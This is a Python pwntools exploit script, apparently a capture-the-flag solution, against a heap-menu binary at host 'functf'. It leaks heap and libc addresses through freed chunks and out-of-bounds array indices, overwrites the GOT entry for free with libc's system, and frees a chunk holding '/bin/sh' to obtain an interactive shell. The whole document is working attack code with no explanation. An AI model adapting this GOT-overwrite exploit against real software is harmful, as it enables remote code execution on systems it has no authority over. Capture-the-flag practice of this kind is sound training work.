from pwn import *

if len(sys.argv)==1:
    context.log_level='debug'
    p=process("linux_server64")
elif sys.argv[1]=="1":
    p=process("./bin")
elif sys.argv[1]=="2":
    context.log_level='debug'
    p=process("./bin")
elif sys.argv[1]=="3":
    p=remote("functf",18013)

arr = 0x6010A0
#.got.plt:0000000000601018 off_601018      dq offset free
#.got.plt:0000000000601020 off_601020      dq offset puts
#.got.plt:0000000000601028 off_601028      dq offset printf
puts_free=0x0000000000601018
puts_got=0x0000000000601020
printf_plt=0x4006a6

def malloc_0(idx):
    p.sendlineafter(">","0")
    p.sendlineafter("idx>",str(idx))

def del_3(idx):
    p.sendlineafter(">","3")
    p.sendlineafter("idx>",str(idx))

def puts_2(idx):
    p.sendlineafter(">","2")
    p.sendlineafter("idx>",str(idx))

def gets_1(idx,buf):
    p.sendlineafter(">","1")
    p.sendlineafter("idx>",str(idx))
    p.sendafter("data>",buf)

def leak(idx):
    puts_2(idx)
    buf=p.recvuntil("\n")
    print hexdump(buf)
    return u64(buf[:-1].ljust(8,'\x00'))

malloc_0(0)
malloc_0(1)
malloc_0(2)
gets_1(2,"/bin/sh")
del_3(0)
del_3(1)
heap1=leak(1)
print 'heap1:',hex(heap1)
print '(heap1-arr)',hex(heap1-arr)
print '(heap1-arr)/8',hex((heap1-arr)/8)
heap_idx0 = (heap1-arr)/8
heap_idx1 = (heap1-arr)/8+6

#payload=p64(puts_got)
payload=p64(puts_free)
gets_1(heap_idx1,payload)

libc_free=leak(heap_idx0)
print 'libc_free:',hex(libc_free)
libc_elf=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base=libc_free - libc_elf.sym["free"]
libc_system=libc_base + libc_elf.sym["system"]
print 'libc_system:',hex(libc_system)

payload=p64(libc_system)
payload+=p64(libc_system)
payload+=p64(printf_plt)
payload+=p64(0xdeadbeef)
gets_1(heap_idx0,payload)

del_3(2)

p.interactive()

